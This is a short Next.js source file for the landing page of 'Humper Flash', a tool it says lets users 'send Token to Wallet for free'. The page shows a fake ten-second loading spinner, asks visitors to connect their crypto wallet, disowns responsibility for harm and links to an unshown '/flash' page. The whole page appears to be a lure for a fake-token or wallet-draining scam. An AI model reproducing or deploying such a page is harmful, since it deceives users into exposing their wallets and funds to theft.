import { useState, useEffect } from 'react';
import Link from 'next/link';

export default function Home() {
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => setIsLoading(false), 10000);
    return () => clearTimeout(timer);
  }, []);

  if (isLoading) return <div className="loading"><div className="spinner"></div></div>;

  return (
    <div className="container home">
      <h1>Humper Flash</h1>
      <p>Humper Flash is a newly launched tool developed by The Axel Brothers to help Users send Token to Wallet for free 😈. Just connect your wallet so that you will be able to pay gas fee when sending transactions. Enjoy 💯</p>
      <p className="disclaimer">This tool should be used responsibly and should not in any way be used to cause harm as we will not be responsible for any harm caused by this tool ⚠️</p>
      <Link href="/flash"><button>Flash Now ⚡</button></Link>
    </div>
  );
    }
